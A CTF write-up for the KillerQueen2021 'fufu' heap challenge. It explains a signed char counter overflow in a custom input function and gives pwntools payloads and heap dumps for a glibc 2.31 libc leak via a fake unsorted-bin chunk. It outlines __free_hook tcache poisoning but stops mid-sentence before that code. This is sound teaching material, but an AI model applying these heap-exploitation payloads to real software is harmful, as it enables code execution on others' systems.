- [fufu writeup from KillerQueen2021 CTF](#fufu-writeup-from-killerqueen2021-ctf)  
- [CODE ANALYSIS](#code-analysis)  
 - [main](#main)  
 - [menu](#menu)  
 - [create](#create)  
 - [inbuf](#inbuf)  
 - [display](#display)  
 - [reset](#reset)  
- [Vulnerability](#vulnerability)  
 - [inbuf](#inbuf-1)  
- [EXPLOITATION](#exploitation)  
 - [checksec](#checksec)  
 - [libc](#libc)  
 - [leaking libc](#leaking-libc)  
 - [unsorted bin](#unsorted-bin)  
 - [deal with the null termination in inbuf](#deal-with-the-null-termination-in-inbuf)  
 - [state of the heap after the leak](#state-of-the-heap-after-the-leak)  
 - [getting a shell](#getting-a-shell)  
 - [tache poison in libc 2.31](#tache-poison-in-libc-231)  
- [CONCLUSION](#conclusion)

# fufu writeup from KillerQueen2021 CTF

I played KQ with my team DragonSec SI. We ended up winning and during the
competition I was able to solve 2 pwnables one of them being this one. I found
the challenges very interesting and so decided to write this writeup.

# CODE ANALYSIS

We are given a dynamically linked elf binary written in C.

## main  
We can see that main will run in a loop asking us to input a number and
calling one of the 3 functions or  
exiting right away.

![image](/KillerQueen2021/Fufu/screenshots/main.png?raw=true "main")

## menu

we can take a look at menu function just to get a feel for what we are up
against.

![image](/KillerQueen2021/Fufu/screenshots/menu.png?raw=true "menu")

aaaand its the usual menu we all love to hate(hinting that this is going to be
a heap challenge). Based  
on the previous challenge written by Rythm I knew at this point that this will
be a long one.

Diving right in we start to figure out what the binary does. There is not much
to it. We have 3 functions(reset(),create(), and display()) that we are
working with

## create

![image](/KillerQueen2021/Fufu/screenshots/create.png?rar=true "create")

Looking at create() we can see that it reads an index from stdin and then
checks if this index is equal to 0.  
So basically we can only work with 1 chunk at a time.

When we enter 0 the pointer written in chnk[0] gets freed. After that a new
chunk gets allocated with the size we provide. The invalid size check will
never trigger since it makes no sence.

The thing that cought my attention here is that the contents that we want to
write to our newly allocated chunk are being read by a custom function inbuf()

## inbuf

![image](/KillerQueen2021/Fufu/screenshots/inbuf.png?rar=true "inbuf")

the custom inbuf function basically reads in the amount of data we provide it
stopping at a '\n' and terminates our input with a null byte

## display

![image](/KillerQueen2021/Fufu/screenshots/display.png?rar=true "display")

Next up is the display function that does nothing but prints a string at our
currently active chunk(the one we malloced with create).

The fact that display is implemented using puts and not something like write
will prove to be quite annoying later on.

## reset

![image](/KillerQueen2021/Fufu/screenshots/reset.png?rar=true "reset")

reset is also quite straightforward. It resets the pointer we are currently
working with.

# Vulnerability

## inbuf

So the vuln in this one is easy to spot but also as easy to miss if the code
is not read properly.  
The vulnerability lies in the custom inbuf function that uses a char type
counter instead somethin like an int(line 6). Thi means that if we were to
allocate a chunk of size greater than 128 and then start writing to it, the
char counter would overflow at 128 and turn into -127 and so we would have an
underflow.

I found no other vulnerabilities in this bin. But this is more than enough to
get a shell.

# EXPLOITATION

tl;dr

- create fake chunk size 0x420  
- free it to place libc pointers on stack  
- create overlapping chunks to read the pointers -> leak  
- setup 3 chunks, 2 free 1 malloced  
- with 3rd overwrite size of second  
- malloc 2nd and free it again to switch tcache  
- again use 3rd to change 2nd fw to __free_hook  
- overwrite __free_hook  
- free("/bin/sh")

## checksec

if we run the checksec tool on our binary we see that pie is enabled and that
there are no canaries and no full relro.

## libc

if we run strings on the libc and grep for glibc we can see that the libc we
are dealing with is 2.31  
I used patchelf to patch the binary to use the libc and ld provided.

## leaking libc

First we define some helper functions

```  
def create(index,size,content):  
   global p  
   p.sendlineafter(b'do?\n',b'1')  
   p.sendlineafter(b'on?\n',str(index))  
   p.sendlineafter(b'want?\n',str(size))  
   p.sendlineafter(b'content.\n',content)

def display(index):  
   global p  
   p.sendlineafter(b'do?\n',b'2')  
   p.sendlineafter(b'dispaly?\n',str(index))

def reset(index):  
   global p  
   p.sendlineafter(b'do?\n',b'3')  
   p.sendlineafter(b'reset?\n',str(index))  
  
```

As usual the firs think we have to do is to leak the libc. This proves to be a
bit of a challenge since we can only work with one chunk at a time(at index
0). So there are 2 things we need to do in order to get the leak from the
heap.

Put some libc addresses on the heap and then read them.

first 3 chunks that we put on the heap are for later use ignore them for now.

```  
create(0,0x10,b'aAA') <--- chunk D  
create(0,0x40, b'VVV') <--- chunk E

create(0,0x90,"FFFFFF") <--- chunk F  
```

## unsorted bin

Usually how we get libc addresses on heap is by using unsorted bins. The idea
is to malloc a large enough chunk(>0x408) that when freed it ends up in the
unsorted bin. At that point libc addresses are put in its fw and bk pointers.
The problem we are facing is that when a big chunk like that is freed and
there are no other chunks between it and the top chunk it will get
consolidated and our plan won't work.

So the way I deal with this is to malloc enough chunks so that their combined
size is greater than 0x408 and then using the underflow change the first
chunk's size to 0x421 and then free it. by doing that there will be at least
one chunk between our fake chunk that I resized and the top chunk so it will
not get consolidated.

```  
create(0,0x60,0x20*b'A') <----- chunk A. We will resize this one to 0x421  
create(0,0x200,0x20*b'B') <---- chunk B. This one we will use to perform the
underflow

create(0,0x70,0x70*b'C')  
reset(0)  
create(0,0x70,0x70*b'C')  
reset(0)  
create(0,0x70,0x70*b'G')  
reset(0)  
payload= b'R'*16  
payload += p64(0x420)  
payload += p64(0x61)  
payload += p64(0)  
payload += p64(0)  
create(0,0x70,payload) <------- chunk C. Inside this one we create a fake
chunk to pass the chek for freeing into unsorted bin

reset(0)  
payload = b'B' * 0x7e <------ payload to overflow char  
payload += b"\x00" * 10 <-------- some padding so the next line lands on the
size of chunk A  
payload += p64(0x421) <----- this will overwrite the size of chunk A to 0x421
using the underflow  
create(0,0x200,payload) <---- chunk B that is returned from tcache  
```

all the chunks that are between chunks C and B are there just so that when A
is resized and freed the pointer &A +0x420 points to area on the heap that we
control(our fake chunk inside chunk C)

you might be also wondering what role do the reset(0) calls play. Well if you
scroll up a bit you will see that the reset function sets the chnk[0] pointer
to 0. So when free is called our chunks that were reset will not be freed.

before:

```  
0x56257ccda3a0: 0x0000000000000000      0x0000000000000071 <--- chunk A  
0x56257ccda3b0: 0x0000000000000000      0x000056257ccda010  
0x56257ccda3c0: 0x4141414141414141      0x4141414141414141  
0x56257ccda3d0: 0x0000000000000000      0x0000000000000000  
0x56257ccda3e0: 0x0000000000000000      0x0000000000000000  
0x56257ccda3f0: 0x0000000000000000      0x0000000000000000  
0x56257ccda400: 0x0000000000000000      0x0000000000000000  
0x56257ccda410: 0x0000000000000000      0x0000000000000211 <--- chunk B  
0x56257ccda420: 0x4242424242424242      0x4242424242424242  
0x56257ccda430: 0x4242424242424242      0x4242424242424242  
0x56257ccda440: 0x0000000000000000      0x0000000000000000  
0x56257ccda450: 0x0000000000000000      0x0000000000000000  
0x56257ccda460: 0x0000000000000000      0x0000000000000000  
0x56257ccda470: 0x0000000000000000      0x0000000000000000  
0x56257ccda480: 0x0000000000000000      0x0000000000000000  
0x56257ccda490: 0x0000000000000000      0x0000000000000000  
0x56257ccda4a0: 0x0000000000000000      0x0000000000000000  
```

```  
0x56257ccda620: 0x0000000000000000      0x0000000000000081  
0x56257ccda630: 0x4343434343434343      0x4343434343434343  
0x56257ccda640: 0x4343434343434343      0x4343434343434343  
0x56257ccda650: 0x4343434343434343      0x4343434343434343  
0x56257ccda660: 0x4343434343434343      0x4343434343434343  
0x56257ccda670: 0x4343434343434343      0x4343434343434343  
0x56257ccda680: 0x4343434343434343      0x4343434343434343  
0x56257ccda690: 0x4343434343434343      0x4343434343434343  
0x56257ccda6a0: 0x0000000000000000      0x0000000000000081  
0x56257ccda6b0: 0x4343434343434343      0x4343434343434343  
0x56257ccda6c0: 0x4343434343434343      0x4343434343434343  
0x56257ccda6d0: 0x4343434343434343      0x4343434343434343  
0x56257ccda6e0: 0x4343434343434343      0x4343434343434343  
0x56257ccda6f0: 0x4343434343434343      0x4343434343434343  
0x56257ccda700: 0x4343434343434343      0x4343434343434343  
0x56257ccda710: 0x4343434343434343      0x4343434343434343  
0x56257ccda720: 0x0000000000000000      0x0000000000000081  
0x56257ccda730: 0x4747474747474747      0x4747474747474747  
0x56257ccda740: 0x4747474747474747      0x4747474747474747  
0x56257ccda750: 0x4747474747474747      0x4747474747474747  
0x56257ccda760: 0x4747474747474747      0x4747474747474747  
0x56257ccda770: 0x4747474747474747      0x4747474747474747  
0x56257ccda780: 0x4747474747474747      0x4747474747474747  
0x56257ccda790: 0x4747474747474747      0x4747474747474747  
0x56257ccda7a0: 0x0000000000000000      0x0000000000000081  
0x56257ccda7b0: 0x5252525252525252      0x5252525252525252  
0x56257ccda7c0: 0x0000000000000420      0x0000000000000061 <--- fake chunk to
pass the check  
0x56257ccda7d0: 0x0000000000000000      0x0000000000000000  
0x56257ccda7e0: 0x0000000000000000      0x0000000000000000  
0x56257ccda7f0: 0x0000000000000000      0x0000000000000000  
0x56257ccda800: 0x0000000000000000      0x0000000000000000  
0x56257ccda810: 0x0000000000000000      0x0000000000000000  
0x56257ccda820: 0x0000000000000000      0x00000000000207e1 <--- top chunk  
```

after:  
```  
0x56257ccda3a0: 0x0000000000000000      0x0000000000000421 <--- chunk A that
we resized using the underflow  
0x56257ccda3b0: 0x0000000000000000      0x000056257ccda010  
0x56257ccda3c0: 0x4141414141414141      0x4141414141414141  
0x56257ccda3d0: 0x0000000000000000      0x0000000000000000  
0x56257ccda3e0: 0x0000000000000000      0x0000000000000000  
0x56257ccda3f0: 0x0000000000000000      0x0000000000000000  
0x56257ccda400: 0x0000000000000000      0x0000000000000000  
0x56257ccda410: 0x0000000000000000      0x0000000000000211  
0x56257ccda420: 0x4242424242424242      0x4242424242424242  
0x56257ccda430: 0x4242424242424242      0x4242424242424242  
0x56257ccda440: 0x4242424242424242      0x4242424242424242  
0x56257ccda450: 0x4242424242424242      0x4242424242424242  
0x56257ccda460: 0x4242424242424242      0x4242424242424242  
0x56257ccda470: 0x4242424242424242      0x4242424242424242  
0x56257ccda480: 0x4242424242424242      0x4242424242424242  
0x56257ccda490: 0x4242424242424242      0x0000424242424242  
0x56257ccda4a0: 0x0000000000000000      0x0000000000000000  
0x56257ccda4b0: 0x0000000000000000      0x0000000000000000  
0x56257ccda4c0: 0x0000000000000000      0x0000000000000000  
0x56257ccda4d0: 0x0000000000000000      0x0000000000000000  
0x56257ccda4e0: 0x0000000000000000      0x0000000000000000  
0x56257ccda4f0: 0x0000000000000000      0x0000000000000000  
0x56257ccda500: 0x0000000000000000      0x0000000000000000  
0x56257ccda510: 0x0000000000000000      0x0000000000000000  
0x56257ccda520: 0x0000000000000000      0x0000000000000000  
0x56257ccda530: 0x0000000000000000      0x0000000000000000  
0x56257ccda540: 0x0000000000000000      0x0000000000000000  
0x56257ccda550: 0x0000000000000000      0x0000000000000000  
0x56257ccda560: 0x0000000000000000      0x0000000000000000  
0x56257ccda570: 0x0000000000000000      0x0000000000000000  
0x56257ccda580: 0x0000000000000000      0x0000000000000000  
0x56257ccda590: 0x0000000000000000      0x0000000000000000  
0x56257ccda5a0: 0x0000000000000000      0x0000000000000000  
0x56257ccda5b0: 0x0000000000000000      0x0000000000000000  
0x56257ccda5c0: 0x0000000000000000      0x0000000000000000  
0x56257ccda5d0: 0x0000000000000000      0x0000000000000000  
0x56257ccda5e0: 0x0000000000000000      0x0000000000000000  
0x56257ccda5f0: 0x0000000000000000      0x0000000000000000  
0x56257ccda600: 0x0000000000000000      0x0000000000000000  
0x56257ccda610: 0x0000000000000000      0x0000000000000000  
0x56257ccda620: 0x0000000000000000      0x0000000000000081  
0x56257ccda630: 0x4343434343434343      0x4343434343434343  
0x56257ccda640: 0x4343434343434343      0x4343434343434343  
0x56257ccda650: 0x4343434343434343      0x4343434343434343  
0x56257ccda660: 0x4343434343434343      0x4343434343434343  
0x56257ccda670: 0x4343434343434343      0x4343434343434343  
0x56257ccda680: 0x4343434343434343      0x4343434343434343  
0x56257ccda690: 0x4343434343434343      0x4343434343434343  
0x56257ccda6a0: 0x0000000000000000      0x0000000000000081  
0x56257ccda6b0: 0x4343434343434343      0x4343434343434343  
0x56257ccda6c0: 0x4343434343434343      0x4343434343434343  
0x56257ccda6d0: 0x4343434343434343      0x4343434343434343  
0x56257ccda6e0: 0x4343434343434343      0x4343434343434343  
0x56257ccda6f0: 0x4343434343434343      0x4343434343434343  
0x56257ccda700: 0x4343434343434343      0x4343434343434343  
0x56257ccda710: 0x4343434343434343      0x4343434343434343  
0x56257ccda720: 0x0000000000000000      0x0000000000000081  
0x56257ccda730: 0x4747474747474747      0x4747474747474747  
0x56257ccda740: 0x4747474747474747      0x4747474747474747  
0x56257ccda750: 0x4747474747474747      0x4747474747474747  
0x56257ccda760: 0x4747474747474747      0x4747474747474747  
0x56257ccda770: 0x4747474747474747      0x4747474747474747  
0x56257ccda780: 0x4747474747474747      0x4747474747474747  
0x56257ccda790: 0x4747474747474747      0x4747474747474747  
0x56257ccda7a0: 0x0000000000000000      0x0000000000000081  
0x56257ccda7b0: 0x5252525252525252      0x5252525252525252  
0x56257ccda7c0: 0x0000000000000420      0x0000000000000061  
0x56257ccda7d0: 0x0000000000000000      0x0000000000000000  
0x56257ccda7e0: 0x0000000000000000      0x0000000000000000  
0x56257ccda7f0: 0x0000000000000000      0x0000000000000000  
0x56257ccda800: 0x0000000000000000      0x0000000000000000  
0x56257ccda810: 0x0000000000000000      0x0000000000000000  
0x56257ccda820: 0x0000000000000000      0x00000000000207e1  
```

now that we have our fake size 0x421 chunk on the heap, we just have to free
it.

if you pay close attention to the code posted above you will see, that we
freed chunk A as well as chunk B. so before we free it again, we have to
malloc

```  
create(0,0x60,0x8*b'F')  
```

that call returned our chunk A from tcache size 0x70 even tho the actual size
is 0x421. This is because when we freed it it was still size 0x71 and so it
was stored in tcache 0x70.

now we free it by mallocing a new chunk(the code of create())

```  
create(0,0xe0,b'WWWWWWWW')  
```

the size of this allocation(0xe0) is important. We will see why soon.

the state of the heap after the call for malloc(0xe0):  
```  
0x56257ccda3a0: 0x0000000000000000      0x00000000000000f1 <--- the new chunk
size 0xe0 we just allocated  
0x56257ccda3b0: 0x5757575757575757      0x00007f6a2f4adf00  
0x56257ccda3c0: 0x000056257ccda3a0      0x000056257ccda3a0  
0x56257ccda3d0: 0x0000000000000000      0x0000000000000000  
0x56257ccda3e0: 0x0000000000000000      0x0000000000000000  
0x56257ccda3f0: 0x0000000000000000      0x0000000000000000  
0x56257ccda400: 0x0000000000000000      0x0000000000000000  
0x56257ccda410: 0x0000000000000000      0x0000000000000211 <--- chunk B -
still freed  
0x56257ccda420: 0x0000000000000000      0x000056257ccda010  
0x56257ccda430: 0x4242424242424242      0x4242424242424242  
0x56257ccda440: 0x4242424242424242      0x4242424242424242  
0x56257ccda450: 0x4242424242424242      0x4242424242424242  
0x56257ccda460: 0x4242424242424242      0x4242424242424242  
0x56257ccda470: 0x4242424242424242      0x4242424242424242  
0x56257ccda480: 0x4242424242424242      0x4242424242424242  
0x56257ccda490: 0x4242424242424242      0x0000000000000331 <--- chunk A that
shrunk  
0x56257ccda4a0: 0x00007f6a2f4adbe0      0x00007f6a2f4adbe0 <--- libc address
we are trying to leak  
0x56257ccda4b0: 0x0000000000000000      0x0000000000000000  
0x56257ccda4c0: 0x0000000000000000      0x0000000000000000  
0x56257ccda4d0: 0x0000000000000000      0x0000000000000000  
0x56257ccda4e0: 0x0000000000000000      0x0000000000000000  
0x56257ccda4f0: 0x0000000000000000      0x0000000000000000  
0x56257ccda500: 0x0000000000000000      0x0000000000000000  
0x56257ccda510: 0x0000000000000000      0x0000000000000000  
0x56257ccda520: 0x0000000000000000      0x0000000000000000  
0x56257ccda530: 0x0000000000000000      0x0000000000000000  
0x56257ccda540: 0x0000000000000000      0x0000000000000000  
0x56257ccda550: 0x0000000000000000      0x0000000000000000  
0x56257ccda560: 0x0000000000000000      0x0000000000000000  
0x56257ccda570: 0x0000000000000000      0x0000000000000000  
0x56257ccda580: 0x0000000000000000      0x0000000000000000  
0x56257ccda590: 0x0000000000000000      0x0000000000000000  
0x56257ccda5a0: 0x0000000000000000      0x0000000000000000  
0x56257ccda5b0: 0x0000000000000000      0x0000000000000000  
0x56257ccda5c0: 0x0000000000000000      0x0000000000000000  
0x56257ccda5d0: 0x0000000000000000      0x0000000000000000  
0x56257ccda5e0: 0x0000000000000000      0x0000000000000000  
0x56257ccda5f0: 0x0000000000000000      0x0000000000000000  
0x56257ccda600: 0x0000000000000000      0x0000000000000000  
0x56257ccda610: 0x0000000000000000      0x0000000000000000  
0x56257ccda620: 0x0000000000000000      0x0000000000000081  
0x56257ccda630: 0x4343434343434343      0x4343434343434343  
0x56257ccda640: 0x4343434343434343      0x4343434343434343  
0x56257ccda650: 0x4343434343434343      0x4343434343434343  
0x56257ccda660: 0x4343434343434343      0x4343434343434343  
0x56257ccda670: 0x4343434343434343      0x4343434343434343  
0x56257ccda680: 0x4343434343434343      0x4343434343434343  
0x56257ccda690: 0x4343434343434343      0x4343434343434343  
0x56257ccda6a0: 0x0000000000000000      0x0000000000000081  
0x56257ccda6b0: 0x4343434343434343      0x4343434343434343  
0x56257ccda6c0: 0x4343434343434343      0x4343434343434343  
0x56257ccda6d0: 0x4343434343434343      0x4343434343434343  
0x56257ccda6e0: 0x4343434343434343      0x4343434343434343  
0x56257ccda6f0: 0x4343434343434343      0x4343434343434343  
0x56257ccda700: 0x4343434343434343      0x4343434343434343  
0x56257ccda710: 0x4343434343434343      0x4343434343434343  
0x56257ccda720: 0x0000000000000000      0x0000000000000081  
0x56257ccda730: 0x4747474747474747      0x4747474747474747  
0x56257ccda740: 0x4747474747474747      0x4747474747474747  
0x56257ccda750: 0x4747474747474747      0x4747474747474747  
0x56257ccda760: 0x4747474747474747      0x4747474747474747  
0x56257ccda770: 0x4747474747474747      0x4747474747474747  
0x56257ccda780: 0x4747474747474747      0x4747474747474747  
0x56257ccda790: 0x4747474747474747      0x4747474747474747  
0x56257ccda7a0: 0x0000000000000000      0x0000000000000081  
0x56257ccda7b0: 0x5252525252525252      0x5252525252525252  
0x56257ccda7c0: 0x0000000000000330      0x0000000000000060  
0x56257ccda7d0: 0x0000000000000000      0x0000000000000000  
0x56257ccda7e0: 0x0000000000000000      0x0000000000000000  
0x56257ccda7f0: 0x0000000000000000      0x0000000000000000  
0x56257ccda800: 0x0000000000000000      0x0000000000000000  
0x56257ccda810: 0x0000000000000000      0x0000000000000000  
0x56257ccda820: 0x0000000000000000      0x00000000000207e1  
```

you might wonder why chunk A shrunk. That is to do with the way the unsorted
bin serves the allocations. Whenever there is a request by malloc for a new
chunk of a given size, if the tcache of that size is empty and the fastbin of
that size is also empty, the new chunk will come out of the unsorted bin by
substracting its size from the size of the chunk currently in the unsorted
bin. In our case 0x420-0xf0 = 0x330.

## deal with the null termination in inbuf  
I mentioned that the size 0xe0 was not chosen randomly. It is actually more
than that, if we request any larger or smaller sized chunk the next part of
the exploit will fail. The whole point of even allocating here is to push the
libc pointers lower down the heap so that chunk A overlaps with chunk B in a
very specific way

```  
payload = 0x80 * 'B'  
create(0,0x200,payload)  
```

now we malloc back chunk B and all of sudden, the libc addresses are in the
body of chunk B that is malloced!  
Not just that, we were also able to write exacly 128 Bs in chunk B and that's
how we bypassed the null termination  
from inbuf. The null byte gets written at 0x56257ccda420 + local_9 where
local_9 is the char counter that overflows to -128.

```  
0x56257ccda3a0: 0x0000000000000000      0x00000000000000f1  
0x56257ccda3b0: 0x0000000000000000      0x000056257ccda010  
0x56257ccda3c0: 0x000056257ccda3a0      0x000056257ccda3a0  
0x56257ccda3d0: 0x0000000000000000      0x0000000000000000  
0x56257ccda3e0: 0x0000000000000000      0x0000000000000000  
0x56257ccda3f0: 0x0000000000000000      0x0000000000000000  
0x56257ccda400: 0x0000000000000000      0x0000000000000000  
0x56257ccda410: 0x0000000000000000      0x0000000000000211 <--- chunk B that
we just malloced back from tcache  
0x56257ccda420: 0x4242424242424242      0x4242424242424242 <--- the 0x80 or
128 Bs we wrote  
0x56257ccda430: 0x4242424242424242      0x4242424242424242  
0x56257ccda440: 0x4242424242424242      0x4242424242424242  
0x56257ccda450: 0x4242424242424242      0x4242424242424242  
0x56257ccda460: 0x4242424242424242      0x4242424242424242  
0x56257ccda470: 0x4242424242424242      0x4242424242424242  
0x56257ccda480: 0x4242424242424242      0x4242424242424242  
0x56257ccda490: 0x4242424242424242      0x4242424242424242 <--- chunk A that
overlaps with chunk B  
0x56257ccda4a0: 0x00007f6a2f4adbe0      0x00007f6a2f4adbe0 <--- pointers are
still here  
0x56257ccda4b0: 0x0000000000000000      0x0000000000000000  
0x56257ccda4c0: 0x0000000000000000      0x0000000000000000  
0x56257ccda4d0: 0x0000000000000000      0x0000000000000000  
0x56257ccda4e0: 0x0000000000000000      0x0000000000000000  
0x56257ccda4f0: 0x0000000000000000      0x0000000000000000  
0x56257ccda500: 0x0000000000000000      0x0000000000000000  
0x56257ccda510: 0x0000000000000000      0x0000000000000000  
0x56257ccda520: 0x0000000000000000      0x0000000000000000  
0x56257ccda530: 0x0000000000000000      0x0000000000000000  
0x56257ccda540: 0x0000000000000000      0x0000000000000000  
0x56257ccda550: 0x0000000000000000      0x0000000000000000  
0x56257ccda560: 0x0000000000000000      0x0000000000000000  
0x56257ccda570: 0x0000000000000000      0x0000000000000000  
0x56257ccda580: 0x0000000000000000      0x0000000000000000  
0x56257ccda590: 0x0000000000000000      0x0000000000000000  
0x56257ccda5a0: 0x0000000000000000      0x0000000000000000  
0x56257ccda5b0: 0x0000000000000000      0x0000000000000000  
0x56257ccda5c0: 0x0000000000000000      0x0000000000000000  
0x56257ccda5d0: 0x0000000000000000      0x0000000000000000  
0x56257ccda5e0: 0x0000000000000000      0x0000000000000000  
0x56257ccda5f0: 0x0000000000000000      0x0000000000000000  
0x56257ccda600: 0x0000000000000000      0x0000000000000000  
0x56257ccda610: 0x0000000000000000      0x0000000000000000  
0x56257ccda620: 0x0000000000000000      0x0000000000000081  
0x56257ccda630: 0x4343434343434343      0x4343434343434343  
0x56257ccda640: 0x4343434343434343      0x4343434343434343  
0x56257ccda650: 0x4343434343434343      0x4343434343434343  
0x56257ccda660: 0x4343434343434343      0x4343434343434343  
0x56257ccda670: 0x4343434343434343      0x4343434343434343  
0x56257ccda680: 0x4343434343434343      0x4343434343434343  
0x56257ccda690: 0x4343434343434343      0x4343434343434343  
0x56257ccda6a0: 0x0000000000000000      0x0000000000000081  
0x56257ccda6b0: 0x4343434343434343      0x4343434343434343  
0x56257ccda6c0: 0x4343434343434343      0x4343434343434343  
0x56257ccda6d0: 0x4343434343434343      0x4343434343434343  
0x56257ccda6e0: 0x4343434343434343      0x4343434343434343  
0x56257ccda6f0: 0x4343434343434343      0x4343434343434343  
0x56257ccda700: 0x4343434343434343      0x4343434343434343  
0x56257ccda710: 0x4343434343434343      0x4343434343434343  
0x56257ccda720: 0x0000000000000000      0x0000000000000081  
0x56257ccda730: 0x4747474747474747      0x4747474747474747  
0x56257ccda740: 0x4747474747474747      0x4747474747474747  
0x56257ccda750: 0x4747474747474747      0x4747474747474747  
0x56257ccda760: 0x4747474747474747      0x4747474747474747  
0x56257ccda770: 0x4747474747474747      0x4747474747474747  
0x56257ccda780: 0x4747474747474747      0x4747474747474747  
0x56257ccda790: 0x4747474747474747      0x4747474747474747  
0x56257ccda7a0: 0x0000000000000000      0x0000000000000081  
0x56257ccda7b0: 0x5252525252525252      0x5252525252525252  
0x56257ccda7c0: 0x0000000000000330      0x0000000000000060  
0x56257ccda7d0: 0x0000000000000000      0x0000000000000000  
0x56257ccda7e0: 0x0000000000000000      0x0000000000000000  
0x56257ccda7f0: 0x0000000000000000      0x0000000000000000  
0x56257ccda800: 0x0000000000000000      0x0000000000000000  
0x56257ccda810: 0x0000000000000000      0x0000000000000000  
0x56257ccda820: 0x0000000000000000      0x00000000000207e1  
```

now all there is left to do is to read the contents of chunk B and we get the
leak

```  
display(0)  
```

## state of the heap after the leak

```  
0x56257ccda290: 0x0000000000000000      0x0000000000000021 <--- chunk D free  
0x56257ccda2a0: 0x0000000000000000      0x000056257ccda010  
0x56257ccda2b0: 0x0000000000000000      0x0000000000000051 <--- chunk E free  
0x56257ccda2c0: 0x0000000000000000      0x000056257ccda010  
0x56257ccda2d0: 0x0000000000000000      0x0000000000000000  
0x56257ccda2e0: 0x0000000000000000      0x0000000000000000  
0x56257ccda2f0: 0x0000000000000000      0x0000000000000000  
0x56257ccda300: 0x0000000000000000      0x00000000000000a1 <--- chunk F free  
0x56257ccda310: 0x0000000000000000      0x000056257ccda010  
0x56257ccda320: 0x0000000000000000      0x0000000000000000  
0x56257ccda330: 0x0000000000000000      0x0000000000000000  
0x56257ccda340: 0x0000000000000000      0x0000000000000000  
0x56257ccda350: 0x0000000000000000      0x0000000000000000  
0x56257ccda360: 0x0000000000000000      0x0000000000000000  
0x56257ccda370: 0x0000000000000000      0x0000000000000000  
0x56257ccda380: 0x0000000000000000      0x0000000000000000  
0x56257ccda390: 0x0000000000000000      0x0000000000000000  
0x56257ccda3a0: 0x0000000000000000      0x00000000000000f1 <--- chunk we used
to push down the pointers size 0xe0  
0x56257ccda3b0: 0x0000000000000000      0x000056257ccda010  
0x56257ccda3c0: 0x000056257ccda3a0      0x000056257ccda3a0  
0x56257ccda3d0: 0x0000000000000000      0x0000000000000000  
0x56257ccda3e0: 0x0000000000000000      0x0000000000000000  
0x56257ccda3f0: 0x0000000000000000      0x0000000000000000  
0x56257ccda400: 0x0000000000000000      0x0000000000000000  
0x56257ccda410: 0x0000000000000000      0x0000000000000211 <--- chunk B  
0x56257ccda420: 0x4242424242424242      0x4242424242424242  
0x56257ccda430: 0x4242424242424242      0x4242424242424242  
0x56257ccda440: 0x4242424242424242      0x4242424242424242  
0x56257ccda450: 0x4242424242424242      0x4242424242424242  
0x56257ccda460: 0x4242424242424242      0x4242424242424242  
0x56257ccda470: 0x4242424242424242      0x4242424242424242  
0x56257ccda480: 0x4242424242424242      0x4242424242424242  
0x56257ccda490: 0x4242424242424242      0x4242424242424242 <--- chunk A  
0x56257ccda4a0: 0x00007f6a2f4adbe0      0x00007f6a2f4adbe0  
0x56257ccda4b0: 0x0000000000000000      0x0000000000000000  
0x56257ccda4c0: 0x0000000000000000      0x0000000000000000  
0x56257ccda4d0: 0x0000000000000000      0x0000000000000000  
0x56257ccda4e0: 0x0000000000000000      0x0000000000000000  
0x56257ccda4f0: 0x0000000000000000      0x0000000000000000  
0x56257ccda500: 0x0000000000000000      0x0000000000000000  
0x56257ccda510: 0x0000000000000000      0x0000000000000000  
0x56257ccda520: 0x0000000000000000      0x0000000000000000  
0x56257ccda530: 0x0000000000000000      0x0000000000000000  
0x56257ccda540: 0x0000000000000000      0x0000000000000000  
0x56257ccda550: 0x0000000000000000      0x0000000000000000  
0x56257ccda560: 0x0000000000000000      0x0000000000000000  
0x56257ccda570: 0x0000000000000000      0x0000000000000000  
0x56257ccda580: 0x0000000000000000      0x0000000000000000  
0x56257ccda590: 0x0000000000000000      0x0000000000000000  
0x56257ccda5a0: 0x0000000000000000      0x0000000000000000  
0x56257ccda5b0: 0x0000000000000000      0x0000000000000000  
0x56257ccda5c0: 0x0000000000000000      0x0000000000000000  
0x56257ccda5d0: 0x0000000000000000      0x0000000000000000  
0x56257ccda5e0: 0x0000000000000000      0x0000000000000000  
0x56257ccda5f0: 0x0000000000000000      0x0000000000000000  
0x56257ccda600: 0x0000000000000000      0x0000000000000000  
0x56257ccda610: 0x0000000000000000      0x0000000000000000  
0x56257ccda620: 0x0000000000000000      0x0000000000000081  
0x56257ccda630: 0x4343434343434343      0x4343434343434343  
0x56257ccda640: 0x4343434343434343      0x4343434343434343  
0x56257ccda650: 0x4343434343434343      0x4343434343434343  
0x56257ccda660: 0x4343434343434343      0x4343434343434343  
0x56257ccda670: 0x4343434343434343      0x4343434343434343  
0x56257ccda680: 0x4343434343434343      0x4343434343434343  
0x56257ccda690: 0x4343434343434343      0x4343434343434343  
0x56257ccda6a0: 0x0000000000000000      0x0000000000000081  
0x56257ccda6b0: 0x4343434343434343      0x4343434343434343  
0x56257ccda6c0: 0x4343434343434343      0x4343434343434343  
0x56257ccda6d0: 0x4343434343434343      0x4343434343434343  
0x56257ccda6e0: 0x4343434343434343      0x4343434343434343  
0x56257ccda6f0: 0x4343434343434343      0x4343434343434343  
0x56257ccda700: 0x4343434343434343      0x4343434343434343  
0x56257ccda710: 0x4343434343434343      0x4343434343434343  
0x56257ccda720: 0x0000000000000000      0x0000000000000081  
0x56257ccda730: 0x4747474747474747      0x4747474747474747  
0x56257ccda740: 0x4747474747474747      0x4747474747474747  
0x56257ccda750: 0x4747474747474747      0x4747474747474747  
0x56257ccda760: 0x4747474747474747      0x4747474747474747  
0x56257ccda770: 0x4747474747474747      0x4747474747474747  
0x56257ccda780: 0x4747474747474747      0x4747474747474747  
0x56257ccda790: 0x4747474747474747      0x4747474747474747  
0x56257ccda7a0: 0x0000000000000000      0x0000000000000081 <--- chunk C  
0x56257ccda7b0: 0x5252525252525252      0x5252525252525252 <--- fake chunk  
0x56257ccda7c0: 0x0000000000000330      0x0000000000000060  
0x56257ccda7d0: 0x0000000000000000      0x0000000000000000  
0x56257ccda7e0: 0x0000000000000000      0x0000000000000000  
0x56257ccda7f0: 0x0000000000000000      0x0000000000000000  
0x56257ccda800: 0x0000000000000000      0x0000000000000000  
0x56257ccda810: 0x0000000000000000      0x0000000000000000  
0x56257ccda820: 0x0000000000000000      0x00000000000207e1

```

## getting a shell

For this part we will make use of the 3 chunks we allocated and freed
before(D,E,F)

## tache poison in libc 2.31

The goal is to poison the tcache and get a chunk at __free_hook and overwrite
it with system and then free("/bin/sh")

in libc 2.31 there are 2 checks that we usually need to worry about.

One is that when we try to malloc from tcache the count in
tcache_perthread_struct has to be > 0 otherwise malloc will ignore whatever is
in tcache. every tcache has its own count that keeps track of how many chunks
